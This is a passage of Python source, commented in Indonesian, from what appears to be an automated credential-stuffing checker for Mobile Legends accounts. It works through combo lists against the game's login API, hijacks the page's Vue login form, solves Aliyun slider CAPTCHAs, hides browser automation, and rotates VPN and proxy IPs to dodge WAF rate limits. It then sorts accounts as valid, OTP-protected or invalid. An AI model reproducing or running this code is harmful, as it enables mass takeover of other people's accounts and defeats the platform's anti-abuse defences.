                            cand_ip = await fetch_public_ip(timeout_s=3.0)
                            if cand_ip != 'unknown' and cand_ip != old_ip:
                                self.current_ip = cand_ip
                                ip_changed = True
                                break
                        if not ip_changed and not _TUI_ACTIVE:
                            p_out(f"{c(GOLD)}[!] Timeout 300s menunggu IP VPN berubah (tetap {old_ip}){W}")
                    elif _IS_TTY and not _TUI_ACTIVE:
                        p_out(f"\n{c(GOLD)}[*] VPN {trigger}: ganti server VPN lalu tekan Enter...{W}")
                        await asyncio.to_thread(input)
                    else:
                        if not _TUI_ACTIVE:
                            p_out(f"\n{c(GOLD)}[*] VPN {trigger}: cooldown {int(self.waf_cooldown)}s (IP tidak terdeteksi)...{W}")
                        await asyncio.sleep(self.waf_cooldown)
                else:
                    if not _TUI_ACTIVE:
                        p_out(f"\n{c(GOLD)}[*] VPN {trigger}: cooldown {int(self.waf_cooldown)}s agar limit pulih...{W}")
                    await asyncio.sleep(self.waf_cooldown)
                    if self.ip_check:
                        new_ip = await fetch_public_ip(timeout_s=3.0)
                        if new_ip != 'unknown':
                            self.current_ip = new_ip

                stats_dict['proxy_label'] = self.label()
                self.consec_waf_rate = 0
                self._recent_outcomes.clear()
                self.last_rotate_checked = stats_dict.get('checked', 0)
                if cmd_ok and ip_changed:
                    self.rotations += 1
                    if not _TUI_ACTIVE:
                        p_out(f"{c(GREEN)}[*] VPN lanjut (IP: {self.current_ip}) ✓{W}")
                    else:
                        _LIVE_LOGS.append(f" {c(GREEN)}*{W}  {c(GREEN)}VPN resume ({self.current_ip}){W}")
                else:
                    if not _TUI_ACTIVE:
                        p_out(f"{c(GOLD)}[!] VPN lanjut tanpa konfirmasi rotasi (IP: {self.current_ip}){W}")
                    else:
                        _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}VPN unconfirmed ({self.current_ip}){W}")
                self.epoch += 1
            finally:
                stats_dict['status'] = 'WAF_WAIT' if self.ovpn_failed else (prev_status if prev_status != 'WAF_WAIT' else 'RUNNING')
                self.rotating = False
                self.gate.set()
                _PERF.resume()
                render_dashboard(force=True)
            return True

# ── Smart Browser Launcher (CloakBrowser Keyless / Termux / System Chromium) ─
async def launch_browser_smart(headless=True, humanize=False):
    global _driver_pid, _pw_instance, _USING_STEALTH_PATCH
    is_root = (os.name != 'nt' and hasattr(os, 'geteuid') and os.geteuid() == 0)
    _bg_kill_args = [
        '--overscroll-history-navigation=0',
        '--disable-features=OverscrollHistoryNavigation',
        '--disable-dev-shm-usage',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-component-update',
        '--disable-domain-reliability',
        '--disable-breakpad',
        '--no-pings',
    ]
    if is_root or _PLAT['is_android'] or _PLAT['is_proot'] or _PLAT['is_termux_native'] or not _PLAT['shm_ok']:
        _bg_kill_args.append('--no-sandbox')
    c_args = [
        '--disable-blink-features=AutomationControlled',
        '--no-first-run',
        '--no-default-browser-check',
        '--no-sandbox',
        '--mute-audio',
        *_bg_kill_args,
    ]
    if _PLAT['is_termux_native'] or _PLAT['is_proot']:
        c_args.extend(['--no-zygote', '--disable-gpu', '--disable-software-rasterizer'])

    lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
    last_err = None
    if not _PLAT['is_termux_native'] and _CLOAKBROWSER_AVAILABLE and launch_async is not None:
        for _try in range(3):
            before_pids = set(_proc_descendants(os.getpid())) if os.name != 'nt' else set()
            try:
                if _try == 0:
                    from cloakbrowser.download import ensure_binary as _ensure_cb_binary
                    await asyncio.to_thread(_ensure_cb_binary, license_key=lic_key or None)
                b = await asyncio.wait_for(
                    launch_async(headless=headless, humanize=humanize, args=_bg_kill_args, license_key=lic_key or None),
                    timeout=30.0,
                )
                _USING_STEALTH_PATCH = False
                mode_lbl = "Pro" if lic_key else "Free (0.6.5 keyless)"
                if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser {mode_lbl} [{_PLAT['tag']}] siap ✓{W}")
                try:
                    _driver_pid = b._impl_obj._connection._transport._proc.pid
                except Exception:
                    pass
                return b
            except BaseException as e:
                if os.name != 'nt':
                    for _opid in (set(_proc_descendants(os.getpid())) - before_pids):
                        try:
                            os.kill(_opid, signal.SIGKILL)
                        except Exception:
                            pass
                if isinstance(e, (asyncio.CancelledError, KeyboardInterrupt, SystemExit)):
                    raise
                last_err = e
                if _try < 2:
                    wait_s = (10.0 if _try == 0 else 15.0) if 'session limit' in str(e).lower() else 2.0
                    dbg(f"CloakBrowser launch retry {_try + 1}/3: {e} (tunggu {int(wait_s)}s)")
                    await asyncio.sleep(wait_s)
                    continue
        if 'session limit' in str(last_err or '').lower() and not _TUI_ACTIVE:
            p_out(f"\n  {c(RED)}[!] CloakBrowser Pro: session limit reached!{W}")
            p_out(f"  {c(GOLD)}    Tunggu ~4 menit agar seat lama bebas, atau tutup sesi lain.{W}\n")
        if PROXY_ENABLED and not (_PLAT['is_proot'] or _PLAT['arch'] in ('aarch64', 'arm64')):
            raise RuntimeError(f"CloakBrowser gagal launch ({last_err}) — batalkan fallback non-stealth agar tidak boros proxy")
        dbg(f"CloakBrowser gagal ({last_err}) → beralih ke Playwright/System Chromium")
    elif _PLAT['is_termux_native']:
        dbg("Termux-Native (Bionic) terdeteksi → memakai system Chromium + Playwright")

    from playwright.async_api import async_playwright
    pw = await async_playwright().start()
    _pw_instance = pw
    try:
        _driver_pid = pw._impl_obj._connection._transport._proc.pid
    except Exception:
        pass
    sys_bin = _find_system_chromium()
    if _PLAT['is_termux_native'] and not sys_bin:
        try:
            await asyncio.wait_for(pw.stop(), timeout=3.0)
        except BaseException:
            _kill_driver_tree()
        _driver_pid = None
        _pw_instance = None
        raise RuntimeError("Termux-Native butuh chromium: jalankan 'pkg update && pkg install chromium' (atau gunakan proot-distro ubuntu)")
    try:
        b = None
        if sys_bin:
            b = await pw.chromium.launch(executable_path=sys_bin, headless=headless, args=c_args)
        else:
            try:
                b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
            except Exception:
                b = await pw.chromium.launch(headless=headless, args=c_args)
        _USING_STEALTH_PATCH = True
        if not _TUI_ACTIVE:
            lbl = os.path.basename(sys_bin) if sys_bin else "Playwright Chromium"
            p_out(f"{c(GOLD)}[*] {lbl} [{_PLAT['tag']}] aktif (VPN stealth patch){W}")
        try:
            _driver_pid = b._impl_obj._connection._transport._proc.pid
        except Exception:
            pass
        return b
    except BaseException:
        try:
            await asyncio.wait_for(pw.stop(), timeout=3.0)
        except BaseException:
            _kill_driver_tree()
        _driver_pid = None
        _pw_instance = None
        raise

# ── Fast Direct HTTP POST in Verified Browser Session ───────────────────────
def build_login_payload(user: str, passw: str) -> dict:
    md5pwd = hashlib.md5(passw.encode('utf-8')).hexdigest()
    sign_str = f"account={user}&country=&md5pwd={md5pwd}&op=new_login_pwd"
    sign = hashlib.md5(sign_str.encode('utf-8')).hexdigest()
    return {
        "op": "new_login_pwd",
        "sign": sign,
        "params": {"account": user, "md5pwd": md5pwd, "country": ""},
        "lang": "en",
    }

async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[str, dict]:
    """Tembak HTTP POST langsung dari dalam session browser yang sudah lolos slider."""
    payload = build_login_payload(user, passw)
    try:
        resp = await page.evaluate(
            """async (bodyObj) => {
                const ac = new AbortController();
                const tm = setTimeout(() => ac.abort(), 12000);
                try {
                    const r = await fetch('https://accountmtapi.mobilelegends.com/', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json, text/plain, */*',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(bodyObj),
                        credentials: 'include',
                        signal: ac.signal
                    });
                    const text = await r.text();
                    return { status: r.status, text: text };
                } catch (e) {
                    return { status: 0, text: String(e) };
                } finally {
                    clearTimeout(tm);
                }
            }""",
            payload,
        )
        status = resp.get("status", 0)
        body = (resp.get("text") or "").strip().lstrip("\ufeff").strip()
        if status == 407:
            return "ERR", {"__proxy_407": True, "message": "407_TRAFFIC_EXHAUSTED"}
        if status == 405:
            return "WAF", {"__waf": True, "message": f"HTTP_{status}"}
        if status == 429 or status >= 500:
            return "ERR", {"__proxy_err": True, "message": f"HTTP_{status}"}
        if not body.startswith("{"):
            low = body.lower()
            if any(k in low for k in ("aliyun", "waf", "captcha", "<html")):
                return "WAF", {"__waf": True, "message": f"HTTP_{status}"}
            return "ERR", {"message": f"HTTP_{status}: {body[:60]}"}
        res_json = json.loads(body)
        if isinstance(res_json.get("data"), str) and len(res_json["data"]) > 20:
            decrypted = decrypt_payload(res_json["data"])
            if decrypted:
                try:
                    res_json["decrypted_data"] = json.loads(decrypted)
                except Exception:
                    pass
        elif isinstance(res_json.get("data"), dict):
            res_json["decrypted_data"] = res_json["data"]
        return classify(res_json), res_json
    except Exception as e:
        return "ERR", {"message": str(e)}

# ── Core Browser Login via Manual Form Typing ────────────────────────────────
async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0, waf_lock: asyncio.Lock | None = None) -> tuple[str, dict]:
    """Submit form dan tangkap respons login menggunakan Direct Vue Bridge + Fallback Natural Typing."""
    api_result = {"json": None, "raw": None, "had_waf": False, "proxy_err": False, "proxy_407": False}
    resp_event = asyncio.Event()
    req_sent = asyncio.Event()

    expected_md5 = hashlib.md5(passw.encode('utf-8')).hexdigest()

    def on_req(req):
        if req.method == 'POST' and ('mpass' in req.url or 'accountmtapi' in req.url):
            try:
                post_raw = req.post_data or ''
                if post_raw:
                    pd = json.loads(post_raw)
                    if not isinstance(pd, dict):
                        return
                    sent_op = pd.get('op', '')
                    if sent_op and sent_op != 'new_login_pwd':
                        return
                    p_obj = pd.get('params') if isinstance(pd.get('params'), dict) else {}
                    sent_acct = p_obj.get('account') or pd.get('account') or pd.get('email') or ''
                    if sent_acct and str(sent_acct).strip().lower() != user.strip().lower():
                        return
                    sent_md5 = p_obj.get('md5pwd') or pd.get('md5pwd') or ''
                    if sent_md5 and str(sent_md5).lower() != expected_md5:
                        return
                req_sent.set()
            except Exception:
                req_sent.set()

    async def on_resp(resp):
        if 'mpass' in resp.url or 'accountmtapi' in resp.url:
            try:
                if resp.request.method != 'POST':
                    return
                post_raw = resp.request.post_data or ''
                if post_raw:
                    try:
                        pd = json.loads(post_raw)
                        if isinstance(pd, dict):
                            sent_op = pd.get('op', '')
                            if sent_op and sent_op != 'new_login_pwd':
                                return
                            p_obj = pd.get('params') if isinstance(pd.get('params'), dict) else {}
                            sent_acct = p_obj.get('account') or pd.get('account') or pd.get('email') or ''
                            if sent_acct and str(sent_acct).strip().lower() != user.strip().lower():
                                return
                            sent_md5 = p_obj.get('md5pwd') or pd.get('md5pwd') or ''
                            if sent_md5 and str(sent_md5).lower() != expected_md5:
                                return
                    except Exception:
                        pass
                # Check HTTP status BEFORE resp.text() so empty/aborted 405/407/5xx never hang 12s
                if resp.status == 407:
                    api_result["proxy_err"] = True
                    api_result["proxy_407"] = True
                    resp_event.set()
                    return
                if resp.status == 405:
                    api_result["had_waf"] = True
                    resp_event.set()
                    return
                if resp.status == 429 or resp.status >= 500:
                    api_result["proxy_err"] = True
                    resp_event.set()
                    return
                body = await resp.text()
                body_stripped = body.strip().lstrip('\ufeff').strip()
                body_low = body_stripped.lower()
                if not body_stripped.startswith('{'):
                    if any(k in body_low for k in ('aliyun', 'waf', 'captcha', '<html')):
                        api_result["had_waf"] = True
                        resp_event.set()
                    elif resp.status >= 400:
                        api_result["proxy_err"] = True
                        resp_event.set()
                else:
                    j = json.loads(body_stripped)
                    if isinstance(j, dict) and j.get('code') is not None:
                        api_result["json"] = j
                        resp_event.set()
                    elif resp.status >= 400:
                        api_result["proxy_err"] = True
                        resp_event.set()
            except Exception:
                pass

    page.on("request", on_req)
    page.on("response", on_resp)
    try:
        # 1. Langsung tembak Vue XHR tanpa wait_for_selector IPC roundtrip (fallback wait jika DOM hilang)
        dbg(f"w{wid:02d} check {user}")
        _vue_js = """([u, p]) => {
            let el = document.querySelector('.content-but');
            let formComp = null;
            while (el) {
                if (el.__vue__ && el.__vue__.submit) { formComp = el.__vue__; break; }
                el = el.parentElement;
            }
            if (!formComp) return false;
            // ponytail: cegah Vue pindah ke halaman OTP saat kena 2FA (1086)
            formComp.jump = function() {};
            if (formComp.$router) formComp.$router.push = function() {};
            formComp.submitState = false;
            formComp.submitforbiden = false;
            formComp.emailerror = false;
            formComp.passworderror = false;
            formComp.email = u;
            formComp.password = p;
            if (formComp.setemailvalue) formComp.setemailvalue(u);
            if (formComp.setpasswordvalue) formComp.setpasswordvalue(p);
            const inpE = document.querySelector('input[type="text"]');
            const inpP = document.querySelector('input[type="password"]');
            if (inpE && inpE.value !== u) { inpE.value = u; inpE.dispatchEvent(new Event('input', {bubbles:true})); }
            if (inpP && inpP.value !== p) { inpP.value = p; inpP.dispatchEvent(new Event('input', {bubbles:true})); }
            formComp.submit();
            if (formComp.emailerror || formComp.passworderror) return 'CLIENT_INVALID';
            return 'OK';
        }"""
        _client_err_js = """() => {
            let el = document.querySelector('.content-but');
            while (el) {
                if (el.__vue__ && el.__vue__.submit) {
                    if (el.__vue__.emailerror || el.__vue__.passworderror) return true;
                    break;
                }
                el = el.parentElement;
            }
            const errEls = document.querySelectorAll('.error-tip, .el-form-item__error, .el-message--error');
            for (const errEl of errEls) {
                const cs = getComputedStyle(errEl);
                if (errEl.getBoundingClientRect().width > 0 && cs.display !== 'none' && cs.visibility !== 'hidden' && (errEl.textContent || '').trim().length > 0) {
                    return true;
                }
            }
            return false;
        }"""
        vue_res = await page.evaluate(_vue_js, [user, passw])
        if vue_res == 'CLIENT_INVALID':
            return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
        vue_submitted = (vue_res == 'OK')
        if not vue_submitted:
            try:
                await page.wait_for_selector('input[type="password"]', timeout=3500)
            except Exception:
                if waf_lock is not None:
                    async with waf_lock:
                        ok_w = await solve_waf(page, ctx)
                else:
                    ok_w = await solve_waf(page, ctx)
                if not ok_w or LOGIN_PAGE.split('?', 1)[0] not in (page.url or ''):
                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                try:
                    await page.wait_for_selector('input[type="password"]', timeout=5000)
                except Exception:
                    try:
                        if await page.evaluate(_SLIDER_VISIBLE_JS):
                            return 'WAF', {'message': 'waf_challenge_on_reload'}
                    except Exception:
                        pass
                    return 'ERR', {'message': 'login_form_not_loaded'}
            vue_res = await page.evaluate(_vue_js, [user, passw])
            if vue_res == 'CLIENT_INVALID':
                return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
            vue_submitted = (vue_res == 'OK')

        if not vue_submitted:
            inputs = await page.query_selector_all('input')
            if len(inputs) < 2:
                return 'ERR', {'message': 'input_elements_not_found'}
            email_input = await page.query_selector('input[type="text"], input[type="email"]') or inputs[0]
            await email_input.click()
            await asyncio.sleep(0.08)
            await page.evaluate("el => { el.value = ''; }", email_input)
            for ch in user:
                await page.keyboard.type(ch)
                await asyncio.sleep(0.01)
            await page.evaluate("""el => {
                if (el) {
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('blur', {bubbles:true}));
                }
            }""", email_input)
            await asyncio.sleep(0.05)
            pwd_input = await page.query_selector('input[type="password"]') or inputs[1]
            await pwd_input.click()
            await asyncio.sleep(0.08)
            await page.evaluate("el => { el.value = ''; }", pwd_input)
            for ch in passw:
                await page.keyboard.type(ch)
                await asyncio.sleep(0.01)
            await page.evaluate("""el => {
                if (el) {
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('blur', {bubbles:true}));
                }
            }""", pwd_input)
            await asyncio.sleep(0.05)
            btn = await page.query_selector('.content-but')
            if btn: await btn.click()
            else: await page.keyboard.press('Enter')

        # 3. Fast client-validation check: hanya return INVALID bila client error benar-benar muncul (hindari false INVALID saat Aliyun JS lambat >2s)
        if not req_sent.is_set() and not resp_event.is_set():
            try:
                await asyncio.wait_for(req_sent.wait(), timeout=2.0)
            except asyncio.TimeoutError:
                pass
        if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
            try:
                if await page.evaluate(_client_err_js):
                    return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
            except Exception:
                pass

        # Adaptive timeout: cepat fail-fast bila XHR belum terkirim, p95-scaled bila request aktif
        t_resp0 = time.monotonic()
        _resp_wait_s = _PERF.adaptive_wait_s(req_sent.is_set())
        try:
            await asyncio.wait_for(resp_event.wait(), timeout=_resp_wait_s)
        except asyncio.TimeoutError:
            pass
        _wait_dt = time.monotonic() - t_resp0
        if api_result["had_waf"]:
            _PERF.record_stall('waf', _wait_dt)
        elif api_result["proxy_err"] or _wait_dt >= 2.5:
            _PERF.record_stall('proxy', _wait_dt)
        if api_result["proxy_407"] and not api_result["json"]:
            return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
        if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
            return 'ERR', {'message': 'PROXY_HTTP_ERR'}

        drag_count = 0
        did_resubmit_ok = False
        if not api_result["json"]:
            for _ in range(2):
                if api_result["had_waf"]:
                    try:
                        await page.wait_for_selector(
                            '#aliyunCaptcha-sliding-slider, .btn_slide, [id*="sliding-slider"]',
                            state='visible', timeout=4500
                        )
                    except Exception:
                        pass
                if api_result["json"]:
                    break
                has_slider = await page.evaluate(_SLIDER_VISIBLE_JS)
                if not has_slider:
                    break
                drag_count += 1
                did_resubmit_ok = False
                dbg(f"w{wid:02d} Aliyun slider ({user}), solving...")
                resp_event.clear()
                api_result["had_waf"] = False
                if waf_lock is not None:
                    async with waf_lock:
                        ok_waf = await solve_waf(page, ctx)
                else:
                    ok_waf = await solve_waf(page, ctx)
                if not ok_waf:
                    break
                # Periksa respons BARU yang mungkin sudah tiba selama solve_waf
                if api_result["proxy_407"] and not api_result["json"]:
                    return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                    return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                if api_result["json"] or api_result["had_waf"]:
                    break
                try:
                    await asyncio.wait_for(resp_event.wait(), timeout=1.5)
                except asyncio.TimeoutError:
                    pass
                if api_result["proxy_407"] and not api_result["json"]:
                    return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                    return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                if not api_result["json"] and not api_result["had_waf"]:
                    req_sent.clear()
                    did_resubmit = False
                    if vue_submitted:
                        r2 = await page.evaluate(_vue_js, [user, passw])
                        if r2 == 'CLIENT_INVALID':
                            return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
                        did_resubmit = (r2 == 'OK')
                    else:
                        await page.evaluate("""() => {
                            let el = document.querySelector('.content-but');
                            while (el) {
                                if (el.__vue__ && el.__vue__.submit) {
                                    el.__vue__.submitState = false;
                                    el.__vue__.submitforbiden = false;
                                    break;
                                }
                                el = el.parentElement;
                            }
                        }""")
                        btn = await page.query_selector('.content-but')
                        if btn:
                            await btn.click()
                            did_resubmit = True
                        else:
                            await page.keyboard.press('Enter')
                            did_resubmit = True
                    if not did_resubmit:
                        return 'WAF', {'message': 'waf_challenge_unsolved'}
                    did_resubmit_ok = True
                    try:
                        await asyncio.wait_for(req_sent.wait(), timeout=1.5)
                    except asyncio.TimeoutError:
                        pass
                    if not req_sent.is_set() and not resp_event.is_set() and not api_result["json"] and not api_result["had_waf"] and not api_result["proxy_err"]:
                        try:
                            if await page.evaluate(_client_err_js):
                                return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
                        except Exception:
                            pass
                    try:
                        await asyncio.wait_for(resp_event.wait(), timeout=10.0)
                    except asyncio.TimeoutError:
                        pass
                if api_result["proxy_407"] and not api_result["json"]:
                    return 'ERR', {'message': '407_TRAFFIC_EXHAUSTED', 'proxy_407': True}
                if api_result["proxy_err"] and not api_result["had_waf"] and not api_result["json"]:
                    return 'ERR', {'message': 'PROXY_HTTP_ERR'}
                if api_result["json"] or api_result["had_waf"]:
                    break  # ponytail: 405 right after solved slider = flagged IP; rotate immediately instead of 2nd slow drag

        res_json = api_result["json"]
        if not res_json:
            if api_result["had_waf"] or (drag_count > 0 and not did_resubmit_ok):
                return 'WAF', {'message': 'waf_challenge_unsolved'}
            if not req_sent.is_set():
                try:
                    if await page.evaluate(_client_err_js):
                        return 'INVALID', {'message': 'Client_InvalidPasswordRule'}
                except Exception:
                    pass
            return 'ERR', {'message': 'timeout_waiting_response'}

        # 4. Dekripsi data jika terenkripsi (VALID / OTP)
        if isinstance(res_json.get('data'), str) and len(res_json['data']) > 20:
            decrypted = decrypt_payload(res_json['data'])
            if decrypted:
                try:
                    res_json['decrypted_data'] = json.loads(decrypted)
                except Exception:
                    pass
        elif isinstance(res_json.get('data'), dict):
            res_json['decrypted_data'] = res_json['data']

        kind = classify(res_json)
        return kind, res_json

    except Exception as e:
        dbg(f"w{wid} login error: {e}")
        return 'ERR', {'message': str(e)}
    finally:
        for ev_n, fn in (("request", on_req), ("response", on_resp)):
            try:
                page.remove_listener(ev_n, fn)
            except Exception:
                pass

_STATIC_CACHE = {}  # url -> (status, headers, body_bytes)
_CACHE_LOCKS: dict[str, asyncio.Lock] = {}
_CACHE_DIRTY = 0
_PROXY_FAILS: dict[tuple[str, str], int] = {}
_VPNPOOL_CFG: dict = {'sh': '', 'lock': None, 'cooldown': {}}

def _vpnpool_slot_from_proxy(proxy: dict | None) -> int:
    srv = (proxy or {}).get('server', '')
    m = re.match(r'^socks5://10\.200\.(\d+)\.2:1080$', srv)
    return int(m.group(1)) if m else 0

def _maybe_rotate_vpnpool_slot(proxy: dict | None):
    sh = _VPNPOOL_CFG.get('sh', '')
    slot = _vpnpool_slot_from_proxy(proxy)
    if not sh or slot <= 0:
        return
    now_t = time.monotonic()
    cd = _VPNPOOL_CFG['cooldown']
    if now_t < cd.get(slot, 0.0):
        return
    cd[slot] = now_t + 60.0
    async def _rot_bg():
        lk = _VPNPOOL_CFG['lock']
        if lk is None:
            lk = asyncio.Lock()
            _VPNPOOL_CFG['lock'] = lk
        async with lk:
            try:
                p = await asyncio.create_subprocess_exec(
                    'bash', sh, 'rotate', str(slot),
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
                )
                await asyncio.wait_for(p.communicate(), timeout=35.0)
                if p.returncode == 0:
                    pk = ((proxy or {}).get('server', ''), (proxy or {}).get('username', ''))
                    _PROXY_FAILS[pk] = 0
                    _LIVE_LOGS.append(f" {c(CYAN)}*{W}  {c(CYAN)}VPN Pool slot #{slot} rotated ✓{W}")
            except Exception as e:
                dbg(f"vpnpool rotate slot {slot} err: {e}")
    try:
        asyncio.create_task(_rot_bg())
    except RuntimeError:
        pass
_RUN_SALT = f"{os.getpid() % 0xfff:x}{int(time.time()) % 0xffff:x}"

def _load_static_cache(path: str = '') -> int:
    fp = path or CACHE_STATE_FILE
    try:
        st = os.stat(fp)
        if time.time() - st.st_mtime > 86400:
            try:
                os.unlink(fp)
            except Exception:
                pass
            return 0
        with open(fp, 'rb') as f:
            raw = f.read()
        data = json.loads(zlib.decompress(raw).decode('utf-8')) if raw[:1] != b'{' else json.loads(raw.decode('utf-8'))
        loaded = 0
        for u, item in list(data.items())[:320]:
            if isinstance(item, list) and len(item) == 3:
                _STATIC_CACHE[u] = (int(item[0]), dict(item[1]), base64.b64decode(item[2]))
                loaded += 1
        return loaded
    except Exception:
        return 0

_CACHE_SAVING = False
_CACHE_SAVE_THREAD_LOCK = threading.Lock()

def _save_static_cache(path: str = '', items=None) -> None:
    global _CACHE_DIRTY
    snap = items if items is not None else list(_STATIC_CACHE.items())[:320]
    if not snap:
        return
    fp = path or CACHE_STATE_FILE
    tmp = f"{fp}.{os.getpid()}.tmp"
    with _CACHE_SAVE_THREAD_LOCK:
        dirty_snap = _CACHE_DIRTY
        try:
            payload = {
                u: [st, hdrs, base64.b64encode(body).decode('ascii')]
                for u, (st, hdrs, body) in snap
            }
            blob = zlib.compress(json.dumps(payload, separators=(',', ':')).encode('utf-8'), 6)
            with open(tmp, 'wb') as f:
                f.write(blob)
            os.replace(tmp, fp)
            _CACHE_DIRTY = max(0, _CACHE_DIRTY - dirty_snap)
        except Exception:
            try:
                if os.path.exists(tmp):
                    os.unlink(tmp)
            except Exception:
                pass

async def _save_static_cache_async() -> None:
    global _CACHE_SAVING
    if _CACHE_SAVING:
        return
    _CACHE_SAVING = True
    try:
        snap = list(_STATIC_CACHE.items())[:320]
        await asyncio.to_thread(_save_static_cache, '', snap)
    finally:
        _CACHE_SAVING = False

_BLOCKED_HOSTS = (
    'sg-api.mobilelegends.com',
    'google-analytics.com',
    'ssl.google-analytics.com',
    'www.google-analytics.com',
    'facebook.com',
    'connect.facebook.net',
    'doubleclick.net',
    'www.google.com',
    'accounts.google.com',
    'clients2.google.com',
    'googleapis.com',
    'gstatic.com',
    'gvt1.com',
    'gvt2.com',
    'errors.aliyun.com',
    '158.177.38.248',
)

def _is_blocked_url(low_url: str) -> bool:
    try:
        sp = urllib.parse.urlsplit(low_url)
        host = sp.hostname or ''
        if not host:
            return False
        if host == 'api.moba5v5.com' and sp.path.startswith('/r'):
            return True
        return any(host == h or host.endswith('.' + h) for h in _BLOCKED_HOSTS)
    except Exception:
        return False

_ROUTE_RE = re.compile(
    r'(\.(png|jpe?g|gif|webp|svg|woff2?|ttf|eot|ico|mp4|mp3|js|css)(\?|$)'
    r'|api\.moba5v5\.com/r|sg-api\.mobilelegends\.com|google-analytics|facebook|doubleclick'
    r'|www\.google\.com|accounts\.google\.com|clients2\.google\.com|googleapis\.com|gstatic\.com'
    r'|gvt[12]\.com|errors\.aliyun\.com|158\.177\.38\.248)',
    re.I,
)

def _is_cacheable_static(status: int, headers: dict, body: bytes) -> bool:
    if status != 200 or not body:
        return False
    ct = ''
    acao = ''
    for k, v in headers.items():
        kl = k.lower()
        if kl == 'content-type':
            ct = str(v).lower()
        elif kl == 'access-control-allow-origin':
            acao = str(v).strip()
    if acao and acao != '*':
        return False
    if 'text/html' in ct or 'application/json' in ct:
        return False
    if ct and not any(t in ct for t in ('javascript', 'ecmascript', 'css')):
        return False
    head = body.lstrip(b'\xef\xbb\xbf \t\r\n')[:32].lower()
    if head.startswith((b'<html', b'<!doctype', b'<script', b'<!--', b'<head', b'<body')):
        return False
    return True

async def _safe_continue(route):
    try:
        await route.continue_()
    except Exception:
        pass

async def _route_filter(route):
    """Abort heavy/telemetry assets and serve static JS/CSS bundles from RAM cache (0 proxy quota on repeat contexts)."""
    r = route.request
    url = r.url
    low = (url or '').lower()
    try:
        if low.startswith(('data:', 'blob:', 'about:')):
            return await _safe_continue(route)
        if r.resource_type in ("image", "media", "font") or _is_blocked_url(low):
            return await route.abort()
        path = url.split("?", 1)[0].lower()
        if r.method == "GET" and path.endswith((".js", ".css")):
            if not any(k in low for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "awsc", "/sd/", "aeis.alicdn", "accountmtapi", "mpass", "moba5v5")):
                if url in _STATIC_CACHE:
                    st, hdrs, body = _STATIC_CACHE[url]
                    return await route.fulfill(status=st, headers=hdrs, body=body)
                if len(_CACHE_LOCKS) >= 384:
                    for k in list(_CACHE_LOCKS.keys()):
                        lk = _CACHE_LOCKS[k]
                        if k not in _STATIC_CACHE and not lk.locked() and not getattr(lk, '_waiters', None):
                            _CACHE_LOCKS.pop(k, None)
                            if len(_CACHE_LOCKS) < 280:
                                break
                if url not in _CACHE_LOCKS and len(_CACHE_LOCKS) >= 384:
                    return await _safe_continue(route)
                lock = _CACHE_LOCKS.setdefault(url, asyncio.Lock())
                async with lock:
                    if url in _STATIC_CACHE:
                        st, hdrs, body = _STATIC_CACHE[url]
                        return await route.fulfill(status=st, headers=hdrs, body=body)
                    try:
                        resp = await asyncio.wait_for(route.fetch(timeout=8000), timeout=9.0)
                        if resp.status == 407:
                            return await route.abort()
                        body = await asyncio.wait_for(resp.body(), timeout=5.0)
                    except Exception:
                        return await _safe_continue(route)
                    live_hdrs = {k: v for k, v in resp.headers.items() if k.lower() not in ('content-encoding', 'content-length', 'transfer-encoding')}
                    cache_hdrs = {k: v for k, v in live_hdrs.items() if k.lower() != 'set-cookie'}
                    if body:
                        cl = resp.headers.get('content-length')
                        ce = (resp.headers.get('content-encoding') or '').lower()
                        wire_sz = int(cl) if (cl and str(cl).isdigit()) else (max(256, len(body) // 3) if ce else len(body))
                        stats['bytes_used'] += wire_sz + 450
                    if _is_cacheable_static(resp.status, cache_hdrs, body):
                        if len(_STATIC_CACHE) >= 320:
                            _STATIC_CACHE.pop(next(iter(_STATIC_CACHE)), None)
                        _STATIC_CACHE[url] = (resp.status, cache_hdrs, body)
                        global _CACHE_DIRTY
                        _CACHE_DIRTY += 1
                        if _CACHE_DIRTY >= 4 and not _CACHE_SAVING:
                            asyncio.create_task(_save_static_cache_async())
                    if resp.status >= 400:
                        return await route.abort()
                    return await route.fulfill(status=resp.status, headers=live_hdrs, body=body)
        return await _safe_continue(route)
    except Exception:
        await _safe_continue(route)

# ── Worker Task Loop with Proxy & WAF Isolation ─────────────────────────────
WAVE_REFRESH_EVERY = 1000

async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     browser, dm, base_proxy_info=None, proxy_pool=None,
                     ensure_browser=None, browser_state=None, acct_retries=None,
                     wave_limit: int = 0, wave_idx: int = 0, vpn_coord=None):
    """
    Worker 1/2-tab per browser context dengan Direct Vue Bridge + Aliyun slider solver.
    """
    if wave_limit and stats['checked'] >= wave_limit:
        return
    ctx              = None
    page             = None
    page2            = None
    cur_browser      = browser
